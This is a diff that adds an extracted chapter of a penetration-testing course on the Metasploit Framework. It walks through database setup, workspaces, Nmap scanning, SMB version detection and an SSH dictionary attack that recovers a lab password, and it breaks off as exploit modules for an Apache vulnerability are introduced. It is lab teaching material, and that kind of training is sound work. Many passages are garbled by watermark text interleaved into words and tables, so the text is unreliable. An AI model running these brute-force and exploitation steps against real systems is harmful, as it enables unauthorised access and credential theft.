@@ -1,0 +1,3172 @@
+                                                                                     Penetration Testing with Kali Linux
+
+21 The Metasploit Framework
+
+In this Learning Module, we will cover the following Learning Units:
+� Getting Familiar with Metasploit
+� Using Metasploit Payloads
+� Performing Post-Exploitation with Metasploit
+� Automating Metasploit
+
+As we have worked through previous Modules, it should be clear that locating, working with, and
+fixing public exploits is difficult. They must be modified to fit each scenario and tested for
+malicious code. Each uses a unique command-line syntax and there is no standardization in
+coding practices or languages.
+
+In addition, even in the most basic attack scenarios, there is a variety of post-exploitation tools,
+auxiliary tools, and attack techniques to consider.
+
+Exploit frameworks aim to address some or all these issues. Although they vary somewhat in
+
+form and function, each aims to consolidate and streamline the process of exploitation by
+
+offering a variety of exploits, simplifying the usage of these exploits, easing lateral movement,
+
+and assisting with the management of compromised infrastructure. Most of these frameworks
+
+offer dynamic payload capabilities. This means that for each exploit in the framework, we can
+
+choose various payloads to deploy.
+
+Over the past  few  years,  several  exploit  and          post-exWphliotiltaowtion  frameworks  have  been  developed,
+including:
+
+� Metasploit                                  Jeffrey
+� Covenant
+
+� Cobalt Strike             theseOcS-a5p7a7b5i2li1ti9e0s.
+� PowerShellEmpire
+
+Each offering some or all
+
+While frameworks such as Cobalt Strike are commercial offerings, the Metasploit Framework
+(MSF, or simply Metasploit) is open-source, frequently updated, and the focus of this Module.
+
+The Metasploit Framework, maintained by Rapid7, is described by its authors as "an advanced
+platform for developing, testing, and using exploit code". The project initially started off as a
+portable network game and has evolved into a powerful tool for penetration testing, exploit
+development, and vulnerability research. The Framework has slowly but surely become the
+leading free exploit collection and development framework for security auditors. Metasploit is
+frequently updated with new exploits and is constantly being improved and further developed by
+Rapid7 and the security community.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                     682
+                                                                                          Penetration Testing with Kali Linux
+
+Kali Linux includes the metasploit-framework package, which contains the open-source elements
+of the Metasploit project. Newcomers to Metasploit are often overwhelmed by the multitude of
+features and different use-cases for the tool as it includes components for information gathering,
+vulnerability research and development, client-side attacks, post-exploitation, and much more.
+
+With such overwhelming capabilities, it's easy to get lost within Metasploit. Fortunately, the
+framework is well thought out and offers a unified and sensible interface.
+
+In this Module, we will provide a walkthrough of the Metasploit Framework, including features and
+usage along with some explanation of its inner workings. While we cover Metasploit in particular,
+we'll discuss various concepts which are true for other exploit frameworks as well. The main goal
+of this Module is to understand how these frameworks can assist us in a real penetration test.
+
+21.1 Getting Familiar with Metasploit
+
+This Learning Unit covers the following Learning Objectives:
+� Set up and navigate Metasploit
+� Use auxiliary modules
+� Leverage exploit modules
+
+In this Learning Unit, we will get familiar with the Metasploit Framework (MSF). We'll start with
+
+setting up the environment and navigating through the framework. Then, we'll get familiar with
+
+two types of modules. In Metasploit, modules are the primary way of interacting with the
+
+framework and are used to perform tasks such as scanning or exploiting a target. First, we'll
+                                                rheovwiewweWehxipctlaolniotwumsoedtuhleesmcofonrtatiansekdsinsMucehtaassplporito. tocol
+explore Metasploit's auxiliary modules   and
+enumeration and port scanning. Finally,  we'll
+
+21.1.1    the  MSeetatsupploiat nFrdamWeowrokrkwcoitmheMsJepSfrefFrinesytalled  on  Kali  Linux,  it  doesn't  start  a  database
+
+Although
+
+sstaheenerrdvvreiikcceeeae,rpiewninhvigtiacsrthirodaiuescsfknaeucoiolftthmsceuoprcenaclfceliigtnsiuvgserfaurOnetlSioaeo-srxn5ope.7nnl7Wos5ai2thbat1ilolte9ei0dodunoosnaisntbtogeo,moastupdtctiasmht.aeMabsoeantssaetKsoapirsillnio.ngitouitnsfmeosramnPdaoatsitotognrryeaStboQoLurutanstaMargdeeattatashbpolasostiste,
+
+We can start the database service as well as create and initialize the MSF database with msfdb
+
+init.
+
+kali@kali:~$ <cu>sudo msfdb init</cu>
+[+] Starting database
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+
+                                       Listing 669 - Creating and initializing the Metasploit database
+
+To enable the database service at boot time we can use systemctl.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                 683
+                                                                             Penetration Testing with Kali Linux
+
+kali@kali:~$ <cu>sudo systemctl enable postgresql</cu>
+Synchronizing state of postgresql.service with SysV service script with
+/lib/systemd/systemd-sysv-install.
+Executing: /lib/systemd/systemd-sysv-install enable postgresql
+Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service 
+/lib/systemd/system/postgresql.service.
+
+                                   Listing 670 - Enabling the postgresql database service at boot time
+
+Now, let's launch the Metasploit command-line interface with msfconsole.
+
+kali@kali:~$ <cu>sudo msfconsole</cu>
+
+...
+
+     =[ metasploit v6.2.20-dev                                            ]
+
++ -- --=[ 2251 exploits - 1187 auxiliary - 399 post                       ]
+
++ -- --=[ 951 payloads - 45 encoders - 11 nops                            ]
+
++ -- --=[ 9 evasion                                                       ]
+
+Metasploit tip: Use help <command> to learn more
+about any command
+Metasploit Documentation: https://docs.metasploit.com/
+
+<cr>msf6 ></cr>
+
+                     Listing 671 - Starting the Metasploit Framework
+
+To hide the banner and version information while starting up, we can add the -q option to the
+msfconsole command.
+
+Once the Metasploit command-line interface is started, we can verify database connectivity with
+
+db_status.                        type:  postgresWqhilt.low
+
+msf6 > <cu>db_status</cu>
+[*] Connected to msf. Connection
+
+CwLtThihosietemthinfmctrghaoaemm6nc7edmo2wsma,osnmhrJdkoo-a,lwbindnsdiev-CtliiidhonneamtedetirmntfihatnaeectnroefddasacocL,tOafeiasStbtMRe-oina5gefge7sosMt76eora57ieues22istsrp1a-c.l9Ccsoe0ToopitnhnlJoSfpeinericmsrtferoefaciipnvrntgiteecddyddaeaCht,steoaaogbnwnmoaudsrmtmeioewacesuoenrnsodcanesuoer,csientt.sivaDciistloalytmtsaoembtfaausCnpeod.rseNBotaCocwokn,mealnemvdti'gsaanCgtdoeestm,afMmnadmoadnuiludisalseer,
+Credentials Backend Commands, and Developer Commands. Throughout this Module, we'll use
+
+commands from most of these categories.
+
+We can get a list of all available commands by entering help.
+
+msf6 > <cu>help</cu>
+
+Core Commands
+=============
+
+     Command     Description
+     -------     -----------
+     ?           Help menu
+     ...
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                684
+                                                                                                                                                                                                                         Penetration Testing with Kali Linux
+
+Module Commands
+===============
+
+Command          Description
+-------          -----------
+...
+search           Searches module names and descriptions
+show             Displays modules of a given type, or all modules
+use              Interact with a module by name or search term/index
+
+Job Commands
+============
+
+Command          Description
+-------          -----------
+...
+
+Resource Script Commands
+========================
+
+Command          Description
+-------          -----------
+...
+
+Database Backend Commands
+=========================
+
+Command              Description    and  recordsWhitthleowoutput          automatically
+-------              -----------
+...
+db_nmap              Executes nmap
+
+       ...           CoSLLLLLmiiiwiimsissssattttttncdaahaaasOlllllSllblll-e5htlsnv77euoowo5orelts2vneett1snise9ric0neiaidbasnnJttielttaihfhhnebifteaerdsitehdedeaytaeaswattdiaboarbnbaatasakesasstehbpeaaecsdeesatabase
+       hosts
+       loot
+       notes
+       services
+       vulns
+       workspace
+
+Credentials Backend
+
+============================
+
+Command          Description
+-------          -----------
+creds            List all credentials in the database
+
+Developer Commands
+==================
+
+Command          Description
+-------          -----------
+...
+                                   Listing 673 Help menu of MSF commands
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                 685
+                                                                                             Penetration Testing with Kali Linux
+
+Before we jump into performing operations within Metasploit, let's discuss one important concept
+first: workspaces. Let's assume we have performed a penetration test and Metasploit stored all
+information about our target and its infrastructure in the database. When we start the next
+penetration test, this information still exists in the database. To address this and avoid mixing
+each assessment's results with results from different assessments, we can use workspaces.
+
+The Metasploit workspace command lists all previously created workspaces. We can switch to a
+workspace by adding the name to the command. To create a new workspace, we must provide
+the workspace name as argument to -a.
+
+Let's create a workspace named pen200 where we'll store the results of this section and the next
+one.
+
+msf6 > <cu>workspace</cu>
+* default
+
+msf6 > <cu>workspace -a pen200</cu>
+[*] Added workspace: pen200
+[*] Workspace: pen200
+
+                                                    Listing 674 - Creating workspace pen200
+
+Once created, Metasploit will use it as a current workspace as shown in listing 674.
+
+Now, let's populate the database and get familiar with some of the Database Backend Commands.
+For this, we'll scan BRUTE2 with db_nmap which is a wrapper to execute Nmap inside Metasploit
+and save the findings in the database. The command has identical syntax to Nmap:
+
+msf6 > <cu>db_nmap</cu>                      [nmWahiptloopwtions]
+[*] Usage: db_nmap [--save | [--help | -h]]
+
+msf6 > <cu>db_nmap -A 192.168.50.202</cu>
+
+[*]  Nmap:  1HS1N2PNo1mtOo33/t5Raa9sr/pt/tTttctschispicpncospwgaunnSpNoo:opprpTmeee9e(AaTnnn9p0p3oE.r17nfSm.tc1selEs9tpRfort2O?spoblVSeir(aIc-dotC5h1Ees77nt9t-5cc2ts2ypp.s11s)n9p.:60/8or./JtMVn5MemE0siifRc.acf(rS2prrIr.0ooeoO2essyoNsroefgfttt))WWaiintnddo2ow0ws2s2Rn-Pe0Ct7b-i2o8s0-3s:s4n8  EDT
+[*]  Nmap:
+[*]  Nmap:
+[*]  Nmap:
+[*]  Nmap:
+[*]  Nmap:
+...
+[*]  Nmap:
+[*]  Nmap:
+
+[*] Nmap: 445/tcp open microsoft-ds?
+
+[*] Nmap: 3389/tcp open ms-wbt-server Microsoft Terminal Services
+
+...
+
+[*] Nmap: 5357/tcp open http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+...
+
+[*] Nmap: 8000/tcp open http          Golang net/http server (Go-IPFS json-rpc or
+
+InfluxDB API)
+
+...
+
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 67.72 seconds
+
+               Listing 675 - Using db_nmap to scan BRUTE2
+
+Listing 675 shows the results of the port scan performed with Nmap. As stated earlier, if the
+database service is running, Metasploit will log findings and information about discovered hosts,
+services, or credentials in a convenient, accessible database.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                686
+                                                                          Penetration Testing with Kali Linux
+
+To get a list of all discovered hosts up to this point, we can enter hosts.
+
+msf6 > <cu>hosts</cu>
+
+Hosts
+=====
+
+address         mac name os_name     os_flavor os_sp purpose info comments
+
+-------         --- ---- -------     --------- ----- ------- ---- --------
+
+192.168.50.202         Windows 2016                                       server
+
+                       Listing 676 - Display all discovered hosts
+
+In addition, we can enter services to display the discovered services from our port scan. We can
+also filter for a specific port number by providing it as argument for -p.
+
+msf6 > <cu>services</cu>
+Services
+========
+
+host            port proto name      state info
+
+----            ---- ----- ----      ----- ----
+
+192.168.50.202 21 tcp ftp            open
+
+192.168.50.202 135 tcp msrpc         open Microsoft Windows RPC
+
+192.168.50.202 139 tcp netbios-ssn open Microsoft Windows netbios-ssn
+
+192.168.50.202 445 tcp microsoft-ds open
+
+192.168.50.202 3389 tcp ms-wbt-server open Microsoft Terminal Services
+
+192.168.50.202 5357 tcp http         open Microsoft HTTPAPI httpd 2.0
+
+SSDP/UPnP
+
+192.168.50.202 8000 tcp http         open Golang net/http server Go-IPFS
+
+json-rpc or InfluxDB API             Whitlow
+
+msf6 > <cu>services -p 8000</cu>
+Services
+
+========               dtp-iscr-cop-ot-vo-eOrLSeinh--sdta-5tinmt-7sg7ep-e56r27v17os-i9cpt--0eea-Dsnt-isJe-peulfapfyiG-ratno-elollf-ydoa-itsnhcgiosvneperetod/inshettr.vtiApcesssewrevecranGof-ilItPeFr Sfojrsosnp-ercpifcicoprort
+
+host            port
+----            ----
+192.168.50.202  8000
+InfluxDB API
+
+Listing 677 shows all
+
+numbers, we can quickly identify all hosts with a specific service running.
+
+When working on an assessment with numerous target systems, Database Backend Commands
+are invaluable in identifying important information and discovering potential attack vectors. We
+can also use the results stored in the database as input to modules, which we'll discuss in the
+next section.
+
+Before we head into the next section, let's briefly review modules again. As stated, modules are
+used to perform tasks in Metasploit such as scanning or exploiting a target. The framework
+includes several thousand modules, divided into categories.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.          687
+                                                                                                                                                                       Penetration Testing with Kali Linux
+
+The categories are displayed on the splash screen summary, but we can also view them with the
+show -h command.
+
+msf6 > <cu>show -h</cu>
+[*] Valid parameters for the "show" command are: all, <cr>encoders</cr>,
+<cr>nops</cr>, <cr>exploits</cr>, <cr>payloads</cr>, <cr>auxiliary</cr>,
+<cr>post</cr>, plugins, info, options
+[*] Additional module-specific parameters are: missing, advanced, <cr>evasion</cr>,
+targets, actions
+msf6 >
+
+                                                 Listing 678 - Help flag for the show command
+
+Listing 678 shows the categories of Metasploit's modules. To activate a module, we need to enter
+use with the module name. The modules all follow a common slash-delimited hierarchical syntax
+(module type/os, vendor, app, operation, or protocol/module name), which makes it easy to explore
+and use the modules. We'll begin by exploring auxiliary modules in the next section and then dive
+into exploit modules.
+
+21.1.2 Auxiliary Modules
+
+The Metasploit Framework includes hundreds of auxiliary modules that provide functionality such
+as protocol enumeration, port scanning, fuzzing, sniffing, and more. Auxiliary modules are useful
+for many tasks, including information gathering (under the gather/ hierarchy), scanning and
+enumeration of various services (under the scanner/ hierarchy), and so on.
+
+There are too many to cover here, but we will demonstrate the syntax and operation of two very
+
+common auxiliary modules. To list all auxiliary modules, we can run the show auxiliary command.
+
+This  will present a very long list of  all  auxiliary  modulWehsitalsoswhown  in                                                                                      the  truncated  output  below:
+
+msf6   > <cu>show auxiliary</cu>
+
+Auxiliary                                    Jeffrey
+=========
+
+201.N9-98-8-8a.0.6m-53-e-19aauuxxiilliiaarrnyyo//rssmccaaalnnnneeNrro//ssOmmSbb-//5ii77Dmm5Cpp2Oaa1Mcc9kk0Eeextte//cdsR-eca-nco-krm-eextsecduD-me-sp-c-r-i-p-t-i-o-n-
+
+normal No   DCOM Exec
+
+987 auxiliary/scanner/smb/impacket/wmiexec
+
+2018-03-19  normal No                   WMI Exec
+
+988 auxiliary/scanner/smb/pipe_auditor
+
+normal No   SMB Session Pipe Auditor
+
+989 auxiliary/scanner/smb/pipe_dcerpc_auditor
+
+normal No   SMB Session Pipe DCERPC Auditor
+
+990 auxiliary/scanner/smb/psexec_loggedin_users
+
+normal No   Microsoft Windows Authenticated Logged In Users Enumeration
+
+991 auxiliary/scanner/smb/smb_enum_gpp
+
+normal No   SMB Group Policy Preference Saved Passwords Enumeration
+
+992 auxiliary/scanner/smb/smb_enumshares
+
+normal No   SMB Share Enumeration
+
+993 auxiliary/scanner/smb/smb_enumusers
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                       688
+                                                                                                                                                                                                            Penetration Testing with Kali Linux
+
+normal    No  SMB User Enumeration (SAM EnumUsers)
+     994
+          auxiliary/scanner/smb/smb_enumusers_domain
+normal
+     995  No  SMB Domain User Enumeration
+
+normal    auxiliary/scanner/smb/smb_login
+     996
+          No  SMB Login Check Scanner
+normal
+     997  auxiliary/scanner/smb/smb_lookupsid
+
+normal    No  SMB SID User Enumeration (LookupSid)
+     998
+          auxiliary/scanner/smb/smb_ms17_010
+normal
+     999  No  MS17-010 SMB RCE Detection
+
+normal    auxiliary/scanner/smb/smb_uninit_cred
+
+          Yes Samba _netr_ServerPasswordSet Uninitialized Credential State
+
+          auxiliary/scanner/smb/smb_version
+
+          No  SMB Version Detection
+
+...
+                                               Listing 679 - Listing all auxiliary modules
+
+We can use search to reduce this considerable output, filtering by app, type, CVE ID, operation,
+platform, and more. For this first example, we want to obtain the SMB version of the previously
+scanned system BRUTE2 by using a Metasploit auxiliary module.
+
+To find the correct module, we can search for all SMB auxiliary modules by entering search
+type:auxiliary smb.
+
+msf6 > <cu>search type:auxiliary smb</cu>
+
+Matching Modules
+================
+
+     # Name                                                                             Whitlow                                                                                                             Disclosure Date Rank  Check
+Description                                                                                                                                                                                                 --------------- ----  -----
+
+     - ----
+
+-no-r-.5m-.2a-.-l-a-uN-xo-i-liaryS/MsBcaSnhnaerre/sEmnbu/msemrba_teinounmshJaerfefsrey
+
+     53   aaauuuNNxxxooiiillliiiaaarrryyySS///MMsffBBuuczzaTTnzzrrneeeerreeerss///CCsssoommmnnbbbnnO///eeSssscc-mmmtt5bbb77___RR5tteee2rrnqq1uueeu9eeeme0su__scttsceoornFnCsounnzereccrzutter_pctoirornupt
+normal
+
+     54
+normal
+
+     55
+
+normal No     SMB User Enumeration (SAM EnumUsers)
+
+56 <cr>auxiliary/scanner/smb/smb_version</cr>
+
+normal No     SMB Version Detection
+
+...
+
+Interact with a module by name or index. For example info 7, use 7 or use
+auxiliary/scanner/http/wordpress_pingback_access
+
+                                    Listing 680 - Searching for all SMB auxiliary modules in Metasploit
+
+Listing 680 shows us all SMB auxiliary modules the search has identified. As stated before; to
+activate a module we can enter use followed by the module name, or use the index provided from
+search results. Let's use the latter to activate the module auxiliary/scanner/smb/smb_version with
+index 56.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                          689
+                                                                                              Penetration Testing with Kali Linux
+
+msf6 > <cu>use 56</cu>
+msf6 <cr>auxiliary(scanner/smb/smb_version)</cr> >
+
+                                                   Listing 681 - Activate smb_version module
+
+Listing 681 shows we have activated the smb_version module as indicated in the command-line
+prompt.
+
+To get information about the currently activated module, we can enter info.
+
+msf6 auxiliary(scanner/smb/smb_version) > <cu>info</cu>
+
+     Name: SMB Version Detection
+ Module: auxiliary/scanner/smb/smb_version
+License: Metasploit Framework License (BSD)
+
+     Rank: Normal
+
+Provided by:
+   hdm <x@hdm.io>
+   Spencer McIntyre
+   Christophe De La Fuente
+
+Check supported:
+   No
+
+Basic options:
+
+Name    Current Setting Required Description
+
+----    --------------- -------- -----------
+
+RHOSTS                      yes  The target host(s), see
+
+https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+
+DhoePTFbsseHirtcRon)rErtgieoeApprDctoSpoirlroitnei1n:ndtf.oarnHodmsatdtiiosoppnelaarnaytdivehnroygesstissyosnoptieermnfadotiTreJthmneeeagfctftsinrioyuesomnyntbaeeWrrmbhieotq(oulutifofiwScraeMovsBncasutierhlearrebvnelrteresm)o.tthwreilelads (max one per
+
+ThseenemcrvroyedrputitleoondseucsapcppraoiprbtitiolLnviisteptyrinrsogniv6eoi8dgn2oeO-1tsSDi-iiao5nsft7pfol7ia5torym2inhn1ega9iit0nSsiofMonBormnaplabrytiooonupttorabecthosouelet.nptthueCroispmnmopbsrv_eeeversorsssfiiiotoohnnnemm3aodn.oud1ld.eu1.le as shown in listing
+682.
+
+The output also contains the Basic options, which are the arguments for the module. We can also
+display the options of a module by entering show options. The options contain a column named
+Required, which specifies if a value needs to be set before the module can be launched. We
+should note that in most modules, Metasploit will already set some of the options for us.
+
+msf6 auxiliary(scanner/smb/smb_version) > <cu>show options</cu>
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+Name    Current Setting Required Description
+
+----    --------------- -------- -----------
+
+<cr>RHOSTS</cr>                  <cr>yes</cr>                             The target host(s)...
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                      690
+                                                                                                                                                                    Penetration Testing with Kali Linux
+
+     THREADS 1       yes         The number of concurrent threads (max one per
+host)
+
+                     Listing 683 - Displaying options of the smb_version module
+
+Listing 683 shows the option RHOSTS has no value set but is required by the module.
+
+To display all required, but not yet set, options we can use the command show missing.
+
+We can add or remove values from options using set and unset. Let's set the value for the option
+RHOSTS to the IP of BRUTE2.
+
+msf6 auxiliary(scanner/smb/smb_version) > <cu>set RHOSTS 192.168.50.202</cu>
+RHOSTS => 192.168.50.202
+
+                                       Listing 684 - Setting the value of the option RHOSTS manually
+
+Instead of setting the value manually, we can also set the value of RHOSTS in an automated
+fashion by leveraging the results in the database. For example, we can set RHOSTS to all
+discovered hosts with open port 445 by entering services, the port number as argument to -p, and
+--rhosts to set the results for this option. Before we do this, we'll unset the current value we
+manually set.
+
+msf6 auxiliary(scanner/smb/smb_version) > <cu>unset RHOSTS</cu>
+Unsetting RHOSTS...
+
+msf6 auxiliary(scanner/smb/smb_version) > <cu>services -p 445 --rhosts</cu>
+
+Services        port proto name           statWehitlionwfo
+========
+
+host
+
+1-<c9-r2->-.R1H6O8S.T5S0.2=0>219-24-4.-51-68.5t-0c-p.-2-0-2<m/-ic-rc-r>-osoft-Jdesffro-ep-ye-n--  ----
+
+Listing  i6n8t5hesdhaotwaLbsisattsinhega,6tw8M5hi-ecSthea,tstOiinnpSgl-ooR5ui7tHr7Osc5Sea2Tt1sS9eti0hn, ieasntvahaueltuoImePaoftoefdrBftRahsUehiTooEnp2vti.aiothne  database results  on  the  stored
+results
+                                                                                                                                                                    RHOSTS based
+
+Now, that we have set all required options, we can launch the module. Let's do this by entering
+run.
+
+msf6 auxiliary(scanner/smb/smb_version) > <cu>run</cu>
+
+[*] 192.168.50.202:445 - SMB Detected (<cr>versions:2, 3</cr>) (<cr>preferred
+
+dialect:SMB 3.1.1</cr>) (compression capabilities:LZNT1, Pattern_V1) (encryption
+
+capabilities:AES-256-GCM) (signatures:optional) (guid:{e09176d2-9a06-427d-9b70-
+
+f08719643f4d}) (authentication domain:BRUTE2)
+
+[*] 192.168.50.202:  - Scanned 1 of 1 hosts (100% complete)
+
+[*] Auxiliary module execution completed
+
+                Listing 686 - Executing the auxiliary module to detect the SMB version of a target
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                       691
+                                                                                                                                                       Penetration Testing with Kali Linux
+
+We just executed our first module as shown in Listing 686. The output shows that the target
+system supports version 2 and 3 of SMB and prefers SMB 3.1.1.
+
+Next, let's use the vulns command to show if Metasploit automatically detected vulnerabilities
+based on the results of this module.
+
+msf6 auxiliary(scanner/smb/smb_version) > <cu>vulns</cu>
+
+Vulnerabilities
+===============
+
+Timestamp          Host                     Name                                                                                                       References
+
+---------          ----                     ----                                                                                                       ----------
+
+2022-07-28 10:17:41 UTC 192.168.50.202 SMB Signing Is Not Required URL-
+
+https://support.microsoft.com/en-us/help/161372/how-to-enable-smb-signing-in-windows-
+
+nt,URL-https://support.microsoft.com/en-us/help/88
+
+                                                                                                                                                       7429/overview-
+
+of-server-message-block-signing
+
+                   Listing 687 - Displaying vulnerabilities identified by Metasploit
+
+Listing 687 shows that our database contains one vulnerability entry about SMB Signing is not
+required and further information about it. This is a great way of quickly identifying vulnerabilities
+without the use of vulnerability scanners.
+
+Next, let's use another module. In the Password Attacks Module, we successfully identified
+credentials on BRUTE by leveraging a dictionary attack against SSH. Instead of Hydra, we can
+also use Metasploit to perform this attack. To begin, we'll search for SSH auxiliary modules.
+
+msf6 auxiliary(scanner/smb/smb_version)  >  <cu>sWehiatrlcohw type:auxiliary                                                                           ssh</cu>
+
+Matching Modules
+================
+                                       Jeffrey
+     # Name                                                                                                                                            Disclosure Date  Rank
+Check Description                                                                                                                                                       ----
+
+-no--r<.1-m-.c6a-.rl>--a1--5uN--xo--i-al-ui-ax-ri-lyS-i/S-asHrcayLn/onsgeciarn/nsnCsehrheO//cSssk-ss5hhS77/_c5sia2dsn1ehn9ne_0rtl<io/fgycin_r>pubkeys  ---------------  normal
+                                                                                                                                                                        normal
+No       SSH Public Key Acceptance Scanner                                                                                                                              normal
+                                                                                                                                                                        normal
+    17 auxiliary/scanner/ssh/ssh_login_pubkey                                                                                                                           normal
+
+No       SSH Public Key Login Scanner
+
+    18 auxiliary/scanner/ssh/ssh_enumusers
+
+No       SSH Username Enumeration
+
+    19 auxiliary/fuzzers/ssh/ssh_version_corrupt
+
+No       SSH Version Corruption
+
+    20 auxiliary/scanner/ssh/ssh_version
+
+No       SSH Version Scanner
+
+    ...
+
+                              Listing 688 - Displaying all SSH auxiliary modules
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                        692
+                                                                                   Penetration Testing with Kali Linux
+
+The output lists an auxiliary module named auxiliary/scanner/ssh/ssh_login with a fitting
+description. We can activate it by using the index 15. Once the module is activated, we can
+display its options.
+
+msf6 auxiliary(scanner/smb/smb_version) > <cu>use 15</cu>
+
+msf6 auxiliary(scanner/ssh/ssh_login) > <cu>show options</cu>
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+Name                Current Setting Required Description
+
+----                --------------- -------- -----------
+
+...
+
+<cr>PASSWORD</cr>                                                         no   A specific password to
+
+authenticate with
+
+<cr>PASS_FILE</cr>                                                        no   File containing passwords,
+
+one per line
+
+<cr>RHOSTS</cr>                                                           yes  The target host(s), see
+
+https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+
+<cr>RPORT</cr>             22                                             yes  The target port
+
+STOP_ON_SUCCESS false                  yes                                Stop guessing when a credential works
+
+for a host
+
+THREADS             1                  yes                                The number of concurrent threads (max
+
+one per host)
+
+<cr>USERNAME</cr>                                                         no   A specific username to
+
+authenticate as
+
+USERPASS_FILE                          no                                 File containing users and passwords
+
+separated by space, one pair per line
+
+USER_AS_PASS        false              no                                 Try the username as the password for
+
+all users                                   WnhioWthleotwher
+
+<cr>USER_FILE</cr>                                                              File containing usernames,
+                                                                               to print output for all
+one per line
+
+VERBOSE             false              yes
+                       Listing 689 - DisplayJoepftfiornesyof the ssh_login module
+attempts
+
+TApAahsssewisrnewitthaohrreHedysevd,xaorarairmo'sbupoosltephot.ipinotniPosan, sswstewocosaredOntSAsi-net5t7ttah7aci5sk2ss1im,n9wg0oldeeupaleas.ssFusowmroteurdnwaaetneadlylr,ueMsaederyt,aoisdrpeplnortoitifviaiedldreetafhidleeysuscseoetnrsnteaavimneirenaglgfueoosrerugrsse.,.
+
+We can specify rockyou.txt for the option PASS_FILE. Finally, we set RHOSTS to 192.168.50.201
+
+and RPORT to 2222.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > <cu>set PASS_FILE
+/usr/share/wordlists/rockyou.txt</cu>
+PASS_FILE => /usr/share/wordlists/rockyou.txt
+
+msf6 auxiliary(scanner/ssh/ssh_login) > <cu>set USERNAME george</cu>
+USERNAME => george
+
+msf6 auxiliary(scanner/ssh/ssh_login) > <cu>set RHOSTS 192.168.50.201</cu>
+RHOSTS => 192.168.50.201
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                        693
+                                                                          Penetration Testing with Kali Linux
+
+msf6 auxiliary(scanner/ssh/ssh_login) > <cu>set RPORT 2222</cu>
+RPORT => 2222
+
+                                                       Listing 690 - Set options of ssh_login
+
+Now, all required options are set, and we can launch the module with run.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > <cu>run</cu>
+
+[*] 192.168.50.201:2222 - Starting bruteforce
+[+] 192.168.50.201:2222 - <cr>Success: 'george:chocolate'</cr> 'uid=1001(george)
+gid=1001(george) groups=1001(george) Linux brute 5.15.0-37-generic #39-Ubuntu SMP Wed
+Jun 1 19:16:45 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 1 opened (192.168.119.2:38329 -> 192.168.50.201:2222) at 2022-07-28
+07:22:05 -0400
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+                                          Listing 691 - Successful dictionary attack with Metasploit
+
+By performing a dictionary attack with the activated auxiliary module, Metasploit could determine
+the correct password as shown in Listing 691. Unlike Hydra, Metasploit not only displays the valid
+credentials, but also opens a session. We'll explore what sessions are and how we can use them
+in the following Learning Unit, but for now, we should understand that Metasploit already provides
+us with interactive access to the target automatically.
+
+As with the vulnerability displayed by the vulns command, we can display all valid credentials we
+gathered up to this point by entering creds.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > <cu>creds</cu>
+
+Credentials        origin  service  pWuhibtlliocw private                                      realm private_type
+===========
+
+host
+
+JtR Format         tsht-1eo-9r-2se-.es-1rv-6thi8Lcei.se5tv,in0aag.nli26Odd09S2c1t-hr5-ee7Dd72-its5e2-yp2n2-pla12-teyi9/-ain0ot-lgsfc-Japcaellrufse(ftadsorvesemehndy)atci-traei-cld.g-aee-nllo-tyir-aflgsoeor-fu-thsc-eh-ino-dac-tto-halbeaadsteea-ta-b-a--se.  ------------   us
+----                                                                                                                                                                                                                                                               Password
+----------
+192.168.50.201                                                                                                                                                                                                                                                  It also shows
+
+Nice! Metasploit
+the related host,
+
+This concludes the section on auxiliary modules. We learned how to search for modules and how
+to set their options to fit our needs. Then we ran two modules and explored how Metasploit
+displays and stores the results. Metasploit offers a broad variety of auxiliary modules covering
+various protocols and techniques such as port scanning, fuzzing, and performing password
+attacks.
+
+21.1.3 Exploit Modules
+
+Now that we are acquainted with basic MSF usage and the usage of auxiliary modules, let's dig
+deeper into the business end of MSF: exploit modules.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                       694
+                                                                                                                                                            Penetration Testing with Kali Linux
+
+Exploit modules most commonly contain exploit code for vulnerable applications and services.
+Metasploit contains over 2200 exploits at the time of this writing. Each was meticulously
+developed and tested, making MSF capable of successfully exploiting a wide variety of vulnerable
+services. These exploits are invoked in much the same way as auxiliary modules.
+
+In this example, we'll leverage one of the exploit modules to get access to the target system
+WEB18. Let's assume we identified that the system runs an Apache 2.4.49 web server and is
+vulnerable to CVE-2021-42013 with a vulnerability scan. We'll attempt to use Metasploit and its
+exploit modules to exploit this vulnerability and get code execution.
+
+Let's create a new workspace for this section and search Metasploit for modules related to
+"Apache 2.4.49".
+
+msf6 auxiliary(scanner/ssh/ssh_login) > <cu>workspace -a exploits</cu>
+[*] Added workspace: exploit
+[*] Workspace: exploit
+
+msf6 auxiliary(scanner/ssh/ssh_login) > <cu>search Apache 2.4.49</cu>
+
+Matching Modules
+================
+
+# Name                                                                    Disclosure Date Rank                                                                                                                                                                                                                                                                                              Check
+
+Description
+
+- ----                                                                    --------------- ----                                                                                                                                                                                                                                                                                              -----
+
+-----------
+
